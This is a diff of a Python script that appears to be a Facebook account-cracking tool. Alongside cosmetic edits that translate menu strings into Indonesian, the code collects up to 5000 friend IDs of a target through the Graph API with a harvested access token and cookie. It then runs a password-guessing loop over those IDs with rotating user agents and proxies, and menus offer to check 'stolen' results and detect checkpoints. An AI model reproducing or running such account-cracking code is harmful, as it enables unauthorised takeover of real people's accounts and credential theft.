@@ -201,7 +201,7 @@ def banner():
 ██║░░██║██║░░██║██║░░░░░██║███████╗██████╔╝                
 ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═════╝░               
 •   GITHUB : https://github.com/HafizdXD   •
-•  WHATSAPP:085758862225  •'''
+•  WHATSAPP:085758862225  •
                                                         
 """%(h))
     
@@ -309,7 +309,7 @@ def menu(my_name,my_id):
 	print(h+'['+h+'➣'+h+'] FB ID     : '+str(my_id))
 	print(h+'['+h+'➣'+h+'] ID DATE   : '+str(birth))
 	print(h+'['+h+'➣'+h+'] IP KAMU  : '+str(sh['origin']))
-	io = '[bold green][01] DUMP DARI PUBLIK\n[02] DUMP PUBLI(MULTI)\n[03] CHECK HASIL MALING\n[04] CHECKPOINT DETECTOR\n[00] LOGOUT[/bold green]'
+	io = '[bold green][01] DUMP ID PUBLIK\n[02] DUMP MASSAL\n[03] CHECK HASIL NYOLONG\n[04] CHECK OPSI CP\n[00] KELUAR[/bold green]'
 	oi = nel(io, style='green')
 	cetak(nel(oi, title='[bold green]MENU[/bold green]'))
 	jh = input(h+'['+h+'➣'+h+'] MENU : ')
@@ -540,8 +540,8 @@ def dump_publik():
 	win = '# DUMP PUBLIC ID'
 	win2 = mark(win, style='green')
 	sol().print(win2)
-	print(x+'['+h+'•'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
-	pil = input(x+'['+p+'f'+x+'] INPUT TARGET ID : ')
+	print(x+'['+h+'•'+x+'] KETIK "me" UNTUK DUMP DARI TEMAN SENDIRI')
+	pil = input(x+'['+p+'f'+x+'] MASUKAN ID TARGET : ')
 	try:
 		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
 		for pi in koh2['friends']['data']:
@@ -562,17 +562,17 @@ def dump_publik():
 
 # DUMP ID MASSAL
 def dump_massal():
-	mas='[01] BULK CRACK FROM FILES\n[02] MANUAL BULK CRACK'
+	mas='[01] CRACK DARI FILES\n[02] CRACK DARI ID'
 	mas2=nel(mas,style='cyan')
-	cetak(nel(mas2,title=' • BULK MENU •'))
-	pilih=input('[•] Choose : ')
+	cetak(nel(mas2,title=' • PILIHAN CRACK •'))
+	pilih=input('[•] Pilih : ')
 	if pilih in ['1','01']:
 		nmfil=input('[•] File Name : ')
 		nmfile=open(nmfil,'r').read().splitlines()
 		for xfil in nmfile:
 			uid.append(xfil)
 	elif pilih in ['2','02']:
-		print(x+'['+h+'•'+x+'] ENTER TOTAL ID LIMIT [20]')
+		print(x+'['+h+'•'+x+'] Mau Berapa Id? MAX[20]')
 		try:
 			jum = int(input(x+'['+p+'f'+x+'] Number Of Id : '))
 		except ValueError:
@@ -587,12 +587,12 @@ def dump_massal():
 			exit()
 		ses=requests.Session()
 		yz = 0
-		print(x+'['+h+'•'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
+		print(x+'['+h+'•'+x+'] KETIK "me" UNTUK DUMP DARI TEMAN SENDIRI')
 		for met in range(jum):
 			yz+=1
 			kl = input(x+'['+h+str(yz)+x+'] Enter The '+str(yz)+'Id : ')
 			uid.append(kl)
-	sed='# WAIT COLLECTING ID'
+	sed='# SEDANG MENGUMPULKAN ID'
 	sol().print(mark(sed, style='green'))
 	ses=requests.Session()
 	for userr in uid:
@@ -611,7 +611,7 @@ def dump_massal():
 			lo = mark(li, style='red')
 			sol().print(lo, style='cyan')
 			exit()
-	tot = '# SUCCESSFUL COLLECTING  %s ID'%(len(id))
+	tot = '# BERHASIL MENGUMPULKAN  %s ID'%(len(id))
 	if len(id)==0:
 		tot2 = mark(tot, style='red')
 	else:
@@ -622,12 +622,12 @@ def dump_massal():
 
 # PENGAT7URAN ID
 def setting():
-	wl = '# ID SEQUENCE SETTINGS'
+	wl = '# PRENGATURAN ID'
 	sol().print(mark(wl, style='green'))
-	teks = '[01] CRACK FROM THE OLDEST ACCOUNT\n[02] CRACK FROM THE YOUNGEST ACCOUNT\n[03] CRACK RANDOM ID'
+	teks = '[01] CRACK AKUN TERTUA (Not Recomended)\n[02] CRACK AKUN TERMUDA\n[03] CRACK RANDOM ID'
 	tak = nel(teks, style='cyan')
-	cetak(nel(tak, title=' • SETTING • '))
-	hu = input(x+'['+p+'f'+x+'] Choose : ')
+	cetak(nel(tak, title=' • PENGATURAN • '))
+	hu = input(x+'['+p+'f'+x+'] Pilih : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -649,11 +649,11 @@ def setting():
 		ric = '# OPTION NOT IN THE MENU'
 		sol().print(mark(ric, style='red'))
 		exit()
-	met = '# CHOOSE CRACK METHOD'
+	met = '# CRACK METHOD'
 	sol().print(mark(met, style='green'))
-	ioz = '[01] METHOD M-FACEBOOK\n[02] METHOD FREE-FACEBOOK\n[03] METHOD TOUCH-FACEBOOK\n[04] METHOD MBASIC-FACEBOOK'
+	ioz = '[01] METHOD M-FACEBOOK (Recomended)\n[02] METHOD FREE-FACEBOOK\n[03] METHOD TOUCH-FACEBOOK\n[04] METHOD MBASIC-FACEBOOK'
 	gess = nel(ioz, style='cyan')
-	cetak(nel(gess, title=' • METHOD • '))
+	cetak(nel(gess, title=' • METHODE • '))
 	hc = input(x+'['+p+'f'+x+']  : ')
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -760,7 +760,7 @@ def crack(idf,pwv):
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
-	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write('\r%s 🔥 %s/%s 🔥 OK:%s 🔥 CP:%s 🔥 %s%s%s 🔥'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
 	for pw in pwv:
 		try:
 			nip=random.choice(prox)
